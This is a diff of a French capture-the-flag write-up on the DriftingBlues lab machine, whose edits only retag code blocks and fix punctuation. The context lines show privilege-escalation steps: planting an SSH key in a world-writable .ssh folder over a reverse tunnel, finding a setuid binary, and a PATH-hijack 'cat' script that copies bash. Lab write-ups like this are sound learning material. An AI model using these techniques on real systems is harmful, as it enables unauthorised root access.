@@ -100,7 +100,7 @@ Robery
 
 Notre prochaine cible est de toute évidence l'utilisateur *robertj* présent sur le système.  
 
-```
+```console
 www-data@driftingblues:/var/www/html$ ls /home/robertj/ -al  
 total 16 
 drwxr-xr-x 3 robertj robertj 4096 Jan  4  2021 . 
@@ -109,9 +109,9 @@ drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
 -r-x------ 1 robertj robertj 1805 Jan  3  2021 user.txt
 ```
 
-Oh ! son dossier *.ssh* est accessible en écriture pour tous. J'utilise le tunnel ReverseSSH pour déposer ma clé publique et je peux ensuite accéder au compte sur le serveur SSH en écoute :  
+Oh ! Son dossier *.ssh* est accessible en écriture pour tous. J'utilise le tunnel ReverseSSH pour déposer ma clé publique et je peux ensuite accéder au compte sur le serveur SSH en écoute :  
 
-```
+```console
 $ sftp -P 8888 127.0.0.1 
 devloop@127.0.0.1's password:  
 Connected to 127.0.0.1. 
@@ -161,7 +161,7 @@ Robert fait partie du clan *operators* : *uid=1000(robertj) gid=1000(robertj) gr
 
 Voyons voir les fichiers pour ce groupe :  
 
-```
+```console
 robertj@driftingblues:~$ find / -group operators 2> /dev/null  
 /usr/bin/getinfo 
 robertj@driftingblues:~$ file /usr/bin/getinfo 
@@ -169,9 +169,9 @@ robertj@driftingblues:~$ file /usr/bin/getinfo
  GNU/Linux 3.2.0, not stripped
 ```
 
-Ce binaire est setuid root et lisible mais la commande strings n'étant pas présente je m'en remet à hexdump pour voir les potentielles chaines intéressantes dans l'exécutable :  
+Ce binaire est setuid root et lisible, mais la commande strings n'étant pas présente je m'en remet à hexdump pour voir les potentielles chaines intéressantes dans l'exécutable :  
 
-```
+```console
 robertj@driftingblues:~$ hexdump -C /usr/bin/getinfo
 --- snip ---
 00002010  23 23 23 23 23 23 23 23  23 23 23 0a 69 70 20 61  |###########.ip a| 
@@ -191,7 +191,7 @@ robertj@driftingblues:~$ hexdump -C /usr/bin/getinfo
 
 On est dans un scénario classique d'exploitation du PATH. Comme le binaire va chercher à exécuter la commande *cat* on va placer sur son chemin un exécutable du même nom qui sera exécuté à la place de celui attendu :  
 
-```
+```console
 robertj@driftingblues:~$ cat cat 
 #!/bin/bash 
 cp /bin/bash /tmp/g0tr00t 
